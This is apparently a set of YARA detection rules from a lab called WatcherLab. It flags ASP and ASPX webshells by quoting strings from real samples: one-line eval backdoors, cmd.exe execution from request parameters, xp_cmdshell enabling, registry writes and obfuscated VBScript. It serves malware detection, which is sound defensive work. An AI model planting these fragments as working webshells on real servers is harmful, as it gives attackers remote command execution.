rule cd64d15a2d1a4f5c134aca1cc1878ce04ce5ffb6
{
     meta:
        description = "asp - file cd64d15a2d1a4f5c134aca1cc1878ce04ce5ffb6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "08c997dca7c0cddfb558cb3c0b6dc675da54f86a3e9fe4a1b09c7ccbbe686e1d"
     strings:
        $s1 = "shell.asp?miemie=av" fullword ascii
        $s2 = "set fs=server.CreateObject(\"scripting.filesystemobject\")" fullword ascii
        $s3 = "<form method=\"POST\" ACTION=\"\">" fullword ascii
        $s4 = "thisfile.Write(\"\"&Request.form(\"1988\") & \"\")" fullword ascii
        $s5 = "response.write\"<font color=red>Success</font>\"" fullword ascii
        $s6 = "value=\"<%=server.mappath(\"akt.asp\")%>\"> <BR>" fullword ascii
        $s7 = "<div id=\"Layer1\">- BY F4ck</div>" fullword ascii
        $s8 = "response.write\"<font color=red>False</font>\"" fullword ascii
        $s9 = "<title>Welcome To AK Team</title>" fullword ascii
        $s10 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_317c890faa4cdf1b5171836bc7255d44be0b6884
{
     meta:
        description = "asp - file 317c890faa4cdf1b5171836bc7255d44be0b6884.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "03269c872c6d0def3e50407a20e117afa08aa54f460c24e38a6be1667e4578e7"
     strings:
        $s1 = "<%execute(request(\"sb\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_47badd01ebcf4b5b8f88c69000dc76c47f0ac1ac
{
     meta:
        description = "asp - file 47badd01ebcf4b5b8f88c69000dc76c47f0ac1ac.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "569f8ad1a9afc9653c718bb799b1534134e092241b6e97e54b2804fd29011b3a"
     strings:
        $s1 = "Pos = InstrB(PosEnd,RequestBin,getByteString(\"Content-Type:\"))" fullword ascii
        $s2 = "<br>Target PATH:<br><INPUT TYPE=\"text\" Name=\"path\" Value=\"C:\\\">" fullword ascii
        $s3 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Disposition\"))" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword ascii
        $s6 = "UploadControl.Add \"ContentType\",ContentType" fullword ascii
        $s7 = "Do until (boundaryPos=InstrB(RequestBin,boundary & getByteString(\"--\")))" fullword ascii
        $s8 = "PosFile = InstrB(BoundaryPos,RequestBin,getByteString(\"filename=\"))" fullword ascii
        $s9 = "PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(13)))" fullword ascii
        $s10 = "PosEnd = InstrB(PosBeg,RequestBin,getByteString(chr(34)))" fullword ascii
        $s11 = "getString = getString & chr(AscB(MidB(StringBin,intCount,1)))" fullword ascii
        $s12 = "Value = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword ascii
        $s13 = "contentType = UploadRequest.Item(\"fichero\").Item(\"ContentType\")" fullword ascii
        $s14 = "FileName = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword ascii
        $s15 = "'Get Filename, content-type and content of file" fullword ascii
        $s16 = "Pos = InstrB(Pos,RequestBin,getByteString(chr(13)))" fullword ascii
        $s17 = "Name = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword ascii
        $s18 = "Pos = InstrB(Pos,RequestBin,getByteString(\"name=\"))" fullword ascii
        $s19 = "UploadControl.Add \"FileName\", FileName" fullword ascii
        $s20 = "<FORM action=\"?ok=1\" method=\"POST\" ENCTYPE=\"multipart/form-data\">" fullword ascii
     condition:
        ( uint16(0) == 0x213c and filesize < 10KB and ( 8 of them ) ) or ( all of them )
}

rule sig_950123df0395b66efde64f8bd39e23f0b9389a87
{
     meta:
        description = "asp - file 950123df0395b66efde64f8bd39e23f0b9389a87.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "58fcf3d1e1d58fa507b6ea15f185cbf7fa541f8739c37d47cfd8b6eb705bff72"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s4 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s7 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s8 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s9 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s10 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s11 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s12 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s14 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s15 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s16 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s17 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s18 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s19 = "si=\"<INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>\"&mmshell&\"</div></center>\"" fullword ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_87ae6677f3c4da1f592d3dc9e76c6370b3d23239
{
     meta:
        description = "asp - file 87ae6677f3c4da1f592d3dc9e76c6370b3d23239.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "480b8dd9f3b52a17aa546f6b30557bb40672605e689b84beea67c09b00a60ec9"
     strings:
        $s1 = "<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>" fullword ascii
        $s2 = "<table width=\"100%\" height=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" bordercolor=\"#FFFFFF\">" fullword ascii
        $s3 = "<body bgcolor=\"#000000\" leftmargin=\"0\" topmargin=\"0\" marginwidth=\"0\" marginheight=\"0\">" fullword ascii
        $s4 = "D /M+lDnr(L+1OcJUmMk2YrUTRok^n?H/Onsr4%n1YE#,ThYAAA==^#~@%>" fullword ascii
        $s5 = "<td><table width=\"700\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"1\">" fullword ascii
        $s6 = "PE@!D+aOmD+m~xm:+{^z09NmYCP^G^/x%Z~DKhdx8!PAr9Y4'2+@*@!&D+XYlM+m@*J,ShsAAA==^#~@%>" fullword ascii
        $s7 = "<%@LANGUAGE=\"VBScript.Encode\" CODEPAGE=\"936\"%>" fullword ascii
        $s8 = "Dc:lawmOtvIn;!+dOc?+M-+M.lMrC4^+k`E?/]&nP{g)HAJbb,MhMAAA==^#~@%>" fullword ascii
        $s9 = "<%#@~^HQAAAA==~6NCDl,'PM+$;+kYcJ1XW[9lYmE#,mwkAAA==^#~@%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 10KB and ( all of them ) ) or ( all of them )
}

rule c1611f9fe3537272f47b9cc1368c8ec164c07775
{
     meta:
        description = "asp - file c1611f9fe3537272f47b9cc1368c8ec164c07775.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bf91ab2d6d4b25a46bfbed95191aab54aa9d31708c0e0f41c3c96c83bc015ed5"
     strings:
        $s1 = "D/@#@&P,?+D~G4Ns6'G4%o9Rok^n/@#@&~~9k:~dDDoNgCs+@#@&P,rx,2M.WMP]+kEhn,1+XO@#@&PPwG.PAl1t~rUnGk.P&UPK4%ok@#@&~~,PdYMo91Cs+{rx" fullword ascii
        $s2 = "arzamO@*E/.nDVkwzYbDE1nj+^4mx3-2ramP-knmb\\.nU- TTD+jVK.DxG;-t2KU5Uw2gquZzHmJzZrdm5A|CExnE^l7PUWrOaW@!" fullword ascii
        $s3 = "#@~^xXIBAA==/KxdDPG209'rE@#@&/;4,?4GS2DMc#@#@&P,(WPADMPPtnU@#@&%J@!8D@*@!C~4D+WxELC\\md1DraY=tkkYK.Xc4Cm0`bv@*@!4M@*PrP[,3.Dcf" fullword ascii
        $s4 = "htp=\"http://odayexp.com/h4cker/sqlss/\"'" fullword ascii
        $s5 = "JW,[PER\"lOkKd;Dn9kD'!rPL~\\(Z.S6P'~rOp!GYmZEM.nxD'ZJ~[~-(Z.S6~[,JR}!WYC\\m6r:!h{!E,[,\\4;DdWPLPm@#@&P~~,PP,~J HlbUO+" fullword ascii
        $s6 = "OPK4%o6'1GO4kUo@#@&,2U9PwEx1YbGx@#@&~nMk-CD+Pw;x1YkKU~ZM+mYnnCOD+.xvV+HhG.9#P~~@#@&~P,/M+CD+hlYD+MU'0+zhKD[@#@&PP,/D" fullword ascii
        $s7 = "@#@&,P,~KHwnSb/O~{PPr lkwRmdCR(lDR8:2 1WhR9GmcN8 9VV nX+ obWctOsR4Y:^RbUmckUkcL2LcL/csWTR:98 :bNc:2& 2" fullword ascii
        $s8 = "VkwqhKt?{UGkDmzgv'^.kPv+sCDw+srwB'nhmx~+sCM0r@!@*9Y@!@*By* W *a=NU;KDo0^l(B'" fullword ascii
        $s9 = "B@*fnV@!&m@*~@!m~tM+WxELl-Ckm.kaO=s;^VwWDs`rEJLInnmY4chlY4'J'J[d Hls+*[EJESrJ/WazsbVnEr#B~^^ld/{vm:v,YbYV" fullword ascii
        $s10 = "`JoG^NnDhCDtE*[r-/4+^sRm/2J=KaO{/YM$bG@#@&AU[P&0@#@&%PE@!wW.:,CmDkGU{BJ'i\"S'JQ)1YrKxy'nK/DvPs+OtKNxvaW/DvP" fullword ascii
        $s11 = "'VmbV^UKPl@!@*BXw =LUk9Nmwv'nsHYdP8xtDNrA,NY@!@*9Y&@!@*vZ!TZ!Za)9x!GDT3^l(Bxn^XYk~F{tY9rAP9Y@!@*[Y&@!@*+hlMWkJ@!@*vZB'.n9DG4" fullword ascii
        $s12 = "v@*}wnx@!zC@*,J@#@&dk{/kLE@!l,tM+W'v%m\\C/1.kaYlo!VVoGM:cJrELInhlDt`hlD4[r-E[dRHCs+#LEJr~Jr3[kDsbVnJEbEP^Vmd/{BChEPYrO^+xB" fullword ascii
        $s13 = "Dxj5Srd3f~RFpKC/khKD['E'ald/SGD9[EI`/+.~&fxJLr9)dDD5E+MX,xPr+a+1PhCkY+M N(WRX2mmtNkCnSs~EJ~[,.+$EndDR0G.s`EHt9r#~LPrBJ=/" fullword ascii
        $s14 = "x~@#@&~NPxP8*P@#@&3U9PqW~@#@&(0,\\bNckYMkxBPbSP8#~',J[E,rD,\\k9`/D.rxBPb~~Fb~{PEfr~K4+U~@#@&P%~{Pq&,@#@&2U9P&0P@#@&&WPtk[`kY.r" fullword ascii
        $s15 = "O~VKmmVLDG;aPCNsrxb/O.mYW.d,l[:bUfP&mN9BPkk.n'E*TB@*@!&O9@*J@#@&LrP@!JO.@*r@#@&LEP@!OMPCVbLx{B^n" fullword ascii
        $s16 = "WYv0S+*@#@&nU9Pr0@#@&6Y2aWMYP{P+X*Z!@#@&DkhnKEY{f@#@&VWTrUEk+MPxPEik+.Pr~[,EdnMP[~-(Z.S6@#@&VGTk" fullword ascii
        $s17 = "/DcJUjCmDkGUr#@#@&r0,PxKO~kkx!:nDr^v?il1OkKxb~Dt+U~M+dwKUk+ " fullword ascii
        $s18 = "?DlDDP{9qAx[@#@&KoJcsk^n?by+,x~fUYmDOPR9&2UN,R&@#@&rW,xWO~G  2XrkYdvja1ls+*~Y4+U@#@&P~9yRl9[P`w1mhn~:sd@#@&+U[,kW@#@&~P" fullword ascii
        $s19 = "[sswoosEPmVroUx^+WY@*E[}4Pcb~ b'r@!&Y9@*@!zOM@*r@#@&g+XO@#@&L~?&@#@&3MDR;s+mD@#@&@#@&0!x1YrWU~T+OC:PnhlLnvEDsb,@#@&W" fullword ascii
        $s20 = "N;WsW.xEaq 8+FyBEE@*J@#@&db'dkLobVn&mK`Sc1mh+*@#@&/b'drLJ@!m~tM+0{v%l7lkm.k2O=s;V^oWM:cErJ[]nhlOtvKmY4LJ'J[dRgC:" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_6684959e4d40495d462b1782602eb5840b56f4de
{
     meta:
        description = "asp - file 6684959e4d40495d462b1782602eb5840b56f4de.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $x2 = "R</a> - <a href='HTTP://WWW.RHESUSFACTOR.CJB.NET' target='_blank'>HTTP://WWW.RHESUSFACTOR.CJB.NET</a> ::.</font>\"" fullword ascii
        $s3 = "cprthtml = \"<font face='arial' size='1'>.:: RHTOOLS 1.5 BETA(PVT)&copy; BY <a href='mailto:rhfactor@antisocial.com'>RHESUS FACT" ascii
        $s4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s5 = "o do Command: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s7 = "Response.Write \"<b>Arquitetura do Processador: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s8 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s9 = "Response.Write \"<b>Identificador do Processador: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s10 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s12 = "szTempFile = \"c:\\\" & oFileSys.GetTempName( ) " fullword ascii
        $s13 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\">\"" fullword ascii
        $s14 = "tion=upload&processupload=yes&path=\" & Request.QueryString(\"path\") & \"\"\">\"" fullword ascii
        $s15 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_DWORD\")" fullword ascii
        $s16 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & strFile" fullword ascii
        $s17 = "Response.Write \"<b>Nome do Computador: </b>\" & WshNetwork.ComputerName & \"<br>\"" fullword ascii
        $s18 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_EXPAND_SZ\")" fullword ascii
        $s19 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_SZ\")" fullword ascii
        $s20 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), Trim(Request.QueryString(\"value\")), \"REG_MULTI_SZ\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9460976304ace3cee3f0c92a0da83e8e3752c443
{
     meta:
        description = "asp - file 9460976304ace3cee3f0c92a0da83e8e3752c443.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "70683c988de5a60d5da1c2d520d5be2183a25a9597a684b56fc3feacada3e6c4"
     strings:
        $s1 = "href='http://www.expdoor.com' title=\"" fullword ascii
        $s2 = "<input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" maxlength=\"50\" />" fullword ascii
        $s3 = "<TITLE>Expdoor.com ASP" fullword ascii
        $s4 = "\">www.Expdoor.com</a>" fullword ascii
        $s5 = "<form method=\"post\" action=\"?action=set\">" fullword ascii
        $s6 = "response.write (\"<script>alert('" fullword ascii
        $s7 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword ascii
        $s8 = "<textarea name=\"Text\" cols=\"50\" rows=\"10\" id=\"Text\">" fullword ascii
     condition:
        ( uint16(0) == 0x543c and filesize < 4KB and ( all of them ) ) or ( all of them )
}

rule sig_9bac59023b27a7ce066f2c4e7d3c1b1df9d5133f
{
     meta:
        description = "asp - file 9bac59023b27a7ce066f2c4e7d3c1b1df9d5133f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "39e42a7d88da56b57f095012aa94590ece4ee28b01984abbe366a52434f4c38c"
     strings:
        $x1 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /" fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>\":o SI:SI=\"\":If tri" ascii
        $x3 = "strBAD=strBAD&\"If Session(\"\"\"&clientPassword&\"\"\")<>\"\"\"\" Then Execute Session(\"\"\"&clientPassword&\"\"\")\"" fullword ascii
        $x4 = "\"\";var speed = 10000;var x = 0;var color = new initArray(\"\"#ffff00\"\", \"\"#ff0000\"\", \"\"#ff00ff\"\",\"\"#0000ff\"\",\"" ascii
        $x5 = "connstr=\"Provider=SQLOLEDB.1;Data Source=\"&targetip &\",\"& portNum &\";User ID=lake2;Password=;\"" fullword ascii
        $x6 = "='#003000'\"\"><a href='?Action=Cmd1Shell' target='FileFrame'><font face='wingdings'>8</font> CMD---" fullword ascii
        $x7 = "<a>&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $x8 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $x9 = "if ShellPath=\"\" Then ShellPath=\"cmd.exe\"" fullword ascii
        $x10 = "STRQUERY=\"DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')\"" fullword ascii
        $s11 = "='\"&DefCmd&\"'> <input type='submit' value='Execute'></td></tr><tr><td id=d><textarea Style='width:100%;height:440;'>\"" fullword ascii
        $s12 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s13 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s14 = "http.SetRequestHeader \"REFERER\", \"\"&net&\"\"&request.ServerVariables(\"HTTP_HOST\")&request.ServerVariables(\"URL\")" fullword ascii
        $s15 = "STRQUERY = \"SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=\" & PATH &\"','SELECT SHELL(\"&CHR(34)&\"CMD.EXE /C " ascii
        $s16 = "or='#003000'\"\"><a href='?Action=Logout' target='FileFrame'><center><font face='wingdings'>8</font> " fullword ascii
        $s17 = "Set DD=CM.exec(ShellPath&\" /c \"&DefCmd)" fullword ascii
        $s18 = "CMD=CHR(34)&\"CMD.EXE /C \"&REQUEST.FORM(\"CMD\")&\" > 8617.TMP\"&CHR(34)" fullword ascii
        $s19 = "<a><a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s20 = "STRQUERY = \"DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\\MICROSOFT\\JET\\4.0\\ENGINES','SANDBOXMOD" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule a925d93c2e46a104bd0ba77bb5bbd48f5fb3d733
{
     meta:
        description = "asp - file a925d93c2e46a104bd0ba77bb5bbd48f5fb3d733.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c9bdbb32a5ff9f7abdb07975fdb815fc2316683fb107e1d9e6dd978e64d300ba"
     strings:
        $s1 = "Function d(s):d=Mid(love,s,1):End Function:love=\"(tqxuesrav l)\"&\"\"\"\":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(" ascii
        $s2 = "Function d(s):d=Mid(love,s,1):End Function:love=\"(tqxuesrav l)\"&\"\"\"\":execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(" ascii
     condition:
        ( uint16(0) == 0x2020 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_450aa28ce1089edf06ce72403563108a94262399
{
     meta:
        description = "asp - file 450aa28ce1089edf06ce72403563108a94262399.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a35878e74425cd97ad98e3ec4b2583867bb536f4275d821cd8b82bc19380ba1a"
     strings:
        $s1 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
        $s2 = "<%@ Assembly Name=\"System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
        $s3 = "<%@ Assembly Name=\"System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\"%>" fullword ascii
        $s4 = "private string GetCmd(string cmd,string shell)" fullword ascii
        $s5 = "Response.Write(GetCmd(ok,shell));" fullword ascii
        $s6 = "<%@ Assembly Name=\"Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a\"%>" fullword ascii
        $s7 = "p.StartInfo.UseShellExecute = false;" fullword ascii
        $s8 = "<%@ import Namespace=\"System.ServiceProcess\"%>" fullword ascii
        $s9 = "<%@ Import Namespace=\"System.Data.SqlClient\"%>" fullword ascii
        $s10 = "Response.Write(shell + ok );" fullword ascii
        $s11 = "<%@ import Namespace=\"System.Data.OleDb\"%>" fullword ascii
        $s12 = "<%@ import Namespace=\"System.Net.Sockets\" %>" fullword ascii
        $s13 = "Process p = new Process();" fullword ascii
        $s14 = "<%@ import Namespace=\"System.Data\"%>" fullword ascii
        $s15 = "<%@ import Namespace=\"System.Web.UI\"%>" fullword ascii
        $s16 = "string shell= Request.QueryString[\"shell\"];" fullword ascii
        $s17 = "<%@ import Namespace=\"System.Text.RegularExpressions\"%>" fullword ascii
        $s18 = "<%@ import Namespace=\"System.Net\" %>" fullword ascii
        $s19 = "<%@ import Namespace=\"System.Runtime.InteropServices\"%>" fullword ascii
        $s20 = "//www.moonsec.com moon" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule sig_11f940a7ca490fa3babca07a7a032440f87e8405
{
     meta:
        description = "asp - file 11f940a7ca490fa3babca07a7a032440f87e8405.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e65f36c9186c0a94d3cb013a1083ef0cef93b3cbc2d8af77dc0911bcced37c62"
     strings:
        $s1 = "I0j+a4m TG|U3|;}V9;(k|/pVB;pst(!.HN/Lbp o;x&}o&rzD(VsNNM^\\(rbMq/qT(/(bqZkL}s}HmpH!d:\\\\8M]s1xH4(!V.N3t74M]s1xH4m#ZE[sskN" fullword ascii
        $s2 = "r}x?GX7FiXg)^I{5I^E\\UZsdkS,*.}!\"r41tO%M9C_9dTFn(6|tAo99V{s7spy+!oOD|n{WcXbNoT2)&002bzjz&hz/)bzb)Fzbjz)b~n%5z3:Mw`5}cVPyXz" fullword ascii
        $s3 = "89-42I[(w6m&rhTqk&.t:\\Hm(H!Jh^Et:R;}sVdtoAtE~L{@#@&r[Vo.&kgs+_Ak8&xV^xSkF+XVNs#/`:,7[//b(whr|PdnZ}3x8:j&}+O/q9TT5" fullword ascii
        $s4 = "1(J~[m@#@&JC.Z;5ytseyYVt/^G/o0B;psM}o3E1Cj\"l;or}_orF:/|;}3xZ(\\48CjVdx$F^+TWt:\\\\lo1TJs}\\8!\"V^xg8(Ms.NA}\\(M\"sm" fullword ascii
        $s5 = "d,O~8@#@&PP,P,~P,Y4kkfCOmP',T@#@&PP,~~PAVk+@#@&~~,P~P,~Y4kd9mYl~x,qU?D.vFS,Am/++cB~Y4kdZ4l.S,\\4~rxmDX;GhwmD" fullword ascii
        $s6 = "lD@#@&@#@&dhbO4PsX&xWW@#@&id l9[Prl^ObWxES,J.+sG7+9Mk7+Dr@#@&7dcl[N,J[.b\\+MJ+DY+MESP9Db\\nDJnDYnD@#@&diRC[9PJhdTIn/aG" fullword ascii
        $s7 = "H2+sjT+AWB[yVVNVLvgXi{;x!F/b*hN_sS}j~G;oV2lq]!mfG*xKdF6pWnJ:\\35o]sq_/nZpN2t_IGrN3yxKdF6pWFJs}%4yqD5" fullword ascii
        $s8 = "lsPC.Mlz/@#@&di0G.,kPx~kY(N,OKPi~W!xNv\\ms#@#@&7dikW~bP@*,dY&NPD4nx,hMkO+cEBJb@#@&7dionU" fullword ascii
        $s9 = ".S1&NW2sOZ69L%09r%A4qGdz\"z|F;)FA_~oUD^dVACp3-nVx0\\gGweOT4^9\"\"tfuzpRlqhhK^mnfW%nsH)`j?;-LHkSwo%b0Vjb8vA/a}\"*Ir.dpz" fullword ascii
        $s10 = "8VmHVG;o3x/}3xZU%-}httlp1ZJ:\\w8!jySUH7mUpKey,O1MwX}`*48" fullword ascii
        $s11 = ".bYnPr@!0KDh~Kx?;8skO'rESkU9WSRVKmmOkKx tM+W~{PB[36aVWMn.uE_T+Oq[cEDn:KO+E# -mVEn mN[?^Cktc*iM+Y!D" fullword ascii
        $s12 = ".kD+~Ewlk^nN,`J,'~2MDcfn/^.bwOkKUPLPEb@!zK9@*@!zPI@*E@#@&7idi2DMR;s+mD@#@&id7n^/+@#@&didd\"ndwKxk+ " fullword ascii
        $s13 = "0K@#@&idi l9N~JmmOrKxJB~J1WwHE@#@&idiRCN[~r0GV9nDkq[EBP0Gs9+./&[@#@&7idclN9PrWk^+dq9JS~6kV" fullword ascii
        $s14 = "DDG.,`EP,',2.MRG+/1Db2YbWUP,[~E*J@#@&7diddi3.DcZ^+CD@#@&id7dinVk+@#@&idd77io\\/TxTHdTPLPJkE1^+k/E@#@&d77idd6rV" fullword ascii
        $s15 = "^FyO&w#OK1862(Lmxg34`VQnOh]&g:\\jsDJN\\TpPzkk8hK%P.6ffV_0?!b^F\"bn)$OH^jA9N3U.K3?0" fullword ascii
        $s16 = "}aZL3x^y.;\\sxVmo.^^&5Wt:\\HCpg!SssE\\:%!^!sZl;*4}!]:4!s.CZTwJ/~:}Vaamfp!^2I49CjySsVZt" fullword ascii
        $s17 = "X3Ks13\\(1(\\q!!my.Tpp]ZmhVb[(\"VF/4wmTswq9%TBy1dI(gyKssDEPL{@#@&r}j^TrkzU5y6t1f\\xn?SoB Or1x]Yxz3FZLVxl" fullword ascii
        $s18 = "O3J,'m@#@&J\\?Aoe+4t8:9s.o9dFUAG/L^L[(xzo q7}Vj,\\ jT.ssz|_N28sI\\9z*k4 g4[M^\\(kXW^hj:Jfz2rSWB8Vsy[oOY8 \"sh" fullword ascii
